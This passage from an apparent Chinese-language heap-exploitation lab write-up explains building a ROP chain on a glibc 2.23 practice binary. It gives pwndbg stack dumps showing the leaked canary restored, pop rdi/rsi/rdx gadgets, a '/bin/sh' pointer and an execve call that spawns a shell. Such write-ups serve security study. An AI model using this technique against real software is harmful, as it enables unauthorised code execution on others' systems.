04:0020│-008 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
05:0028│ rbp 0x7ffde64b2bf0 ◂— 0
06:0030│+008 0x7ffde64b2bf8 —▸ 0x7db0f941fc39 (__libc_start_main+385) ◂— jmp __libc_start_main+464
07:0038│+010 0x7ffde64b2c00 —▸ 0x7db0f97897d8 —▸ 0x7db0f94964f6 (init_cacheinfo) ◂— push r13
pwndbg> 
```

在成功获得栈内存的写权限（通过 `chunks[3]`）后，技术链进入最终阶段：部署 **面向返回的编程（ROP）** 技术。此技术通过在栈上**精确布局一系列来自 libc 等已加载模块的短指令序列（即 gadgets）的地址**，构造一个预设的调用链，以实现特定的代码执行目标。

具体布局如下：
1.  **参数准备 Gadgets**：根据目标系统调用（如 `execve`）的调用约定（在 x86-64 Linux 上为 System V AMD64 ABI），需按顺序设置 `RDI`、`RSI`、`RDX` 等寄存器。因此，ROP 链起始于一系列 **pop** gadget，例如：
    *   `pop rdi; ret`：用于将第一个参数（如字符串 `"/bin/sh"` 的地址）置入 `RDI` 寄存器。
    *   `pop rsi; ret`：用于将第二个参数（例如 `0`）置入 `RSI` 寄存器。
    *   `pop rdx; ret`：用于将第三个参数（例如 `0`）置入 `RDX` 寄存器。
2.  **目标函数地址**：在正确设置所有参数后，ROP 链的下一个位置放置**目标系统调用或库函数的地址**，例如 `execve` 或 `system` 的地址。当执行流到达此处时，将调用该函数，并传入已设置好的参数。
3.  **链式执行**：每个 gadget 地址之后都跟随一个 `ret` 指令，确保 CPU 在执行完当前 gadget 后，能继续从栈中取出下一个地址并跳转执行，从而实现 **gadget 的链式执行**。

在此次操作中，通过向 `chunks[3]` 写入数据，从精确计算的偏移位置开始，在栈上依次布置：
*   写入先前获取的 **栈金丝雀（Canary）** 值以保持其正确性。
*   填充的栈空间。
*   `pop rdi; ret` gadget 的地址，后跟 `"/bin/sh"` 字符串的地址。
*   `pop rsi; ret` gadget 的地址，后跟参数 `0`。
*   `pop rdx; ret` gadget 的地址，后跟参数 `0`。
*   最终，`execve` 函数的地址。

**此次布局的核心，是将对栈数据的可控写入，转化为对程序控制流的预定引导**。当程序返回时，其返回地址被更新为第一个 gadget 的地址，从而启动整个 ROP 链的执行，最终达成调用 `execve("/bin/sh", 0, 0)` 的目标。这是从内存操作到实现特定语义化功能（如命令执行）的最终步骤。

```bash
pwndbg> telescope 0x7ffde64b2bc8 13
00:0000│ rsi 0x7ffde64b2bc8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        3 skipped
04:0020│+048 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
05:0028│+050 0x7ffde64b2bf0 ◂— 0
06:0030│+058 0x7ffde64b2bf8 —▸ 0x7db0f94202f1 (iconv+358) ◂— pop rdi
07:0038│+060 0x7ffde64b2c00 —▸ 0x7db0f9556d73 ◂— 0x68732f6e69622f /* '/bin/sh' */
08:0040│+068 0x7ffde64b2c08 —▸ 0x7db0f941fee3 (__gcc_personality_v0+81) ◂— pop rsi
09:0048│+070 0x7ffde64b2c10 ◂— 0
0a:0050│+078 0x7ffde64b2c18 —▸ 0x7db0f9401b92 ◂— pop rdx
0b:0058│+080 0x7ffde64b2c20 ◂— 0
0c:0060│+088 0x7ffde64b2c28 —▸ 0x7db0f94b3670 (execve) ◂— mov eax, 0x3b
pwndbg> 
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
